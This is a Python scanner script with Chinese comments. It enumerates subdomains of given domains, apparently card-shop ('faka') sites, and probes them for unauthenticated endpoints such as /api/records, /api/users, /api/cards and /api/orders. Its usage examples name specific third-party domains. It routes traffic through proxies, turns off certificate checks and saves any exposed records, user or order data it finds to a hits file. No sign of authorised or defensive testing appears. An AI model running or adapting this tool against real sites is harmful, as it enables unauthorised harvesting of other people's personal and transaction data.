#!/usr/bin/env python3
"""
异次元 sb 子域未授权 API 探测（/api/records 等）。

示例:
  python3 sb_subdomain_scan.py shopping.qq898.vip
  python3 sb_subdomain_scan.py zhanghao9.com --prefixes sb,api,admin,merchant
"""
from __future__ import annotations

import argparse
import json
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

import requests

from faka_common import DEFAULT_UA, ensure_out, json_or_text, load_proxy, log, save_hit

SB_PATHS = [
    "/api/records",
    "/api/record",
    "/api/cards",
    "/api/card",
    "/api/users",
    "/api/orders",
    "/records",
    "/api/v1/records",
]


def probe(url: str, path: str, timeout: int, proxy: str) -> tuple[str, Any]:
    full = url.rstrip("/") + path
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        for method in ("GET", "POST"):
            if method == "GET":
                r = requests.get(full, headers={"User-Agent": DEFAULT_UA}, timeout=timeout, proxies=proxies, verify=False)
            else:
                r = requests.post(full, json={}, headers={"User-Agent": DEFAULT_UA}, timeout=timeout, proxies=proxies, verify=False)
            data = json_or_text(r)
            if r.status_code == 200:
                if isinstance(data, (dict, list)) and data:
                    return path, {"method": method, "status": r.status_code, "data": data}
                if isinstance(data, str) and len(data) > 50 and "404" not in data[:100]:
                    return path, {"method": method, "status": r.status_code, "text": data[:500]}
    except Exception as e:
        return path, {"error": str(e)}
    return path, None


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="sb 子域 API 扫描")
    ap.add_argument("domain", help="主域名或完整 URL")
    ap.add_argument("--prefixes", default="sb,api,cdn,static,admin")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--out", default="/data/tools/faka/out/sb_scan.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = load_proxy() if args.proxy == "auto" else ("" if args.proxy == "none" else args.proxy)

    if args.domain.startswith("http"):
        hosts = [urlparse(args.domain).netloc]
    else:
        hosts = [f"{p}.{args.domain}" for p in args.prefixes.split(",") if p.strip()]

    hits = 0
    for host in hosts:
        base = f"https://{host}"
        log(f"[*] {base}")
        for path in SB_PATHS:
            p, data = probe(base, path, args.timeout, proxy)
            if data and not data.get("error"):
                hits += 1
                save_hit(Path(args.out), "sb_hit", {"host": host, "path": p, "result": data})
                log(f"[+] {host}{p} -> {json.dumps(data, ensure_ascii=False)[:200]}")

    log(f"完成 hits={hits} -> {args.out}")


if __name__ == "__main__":
    main()
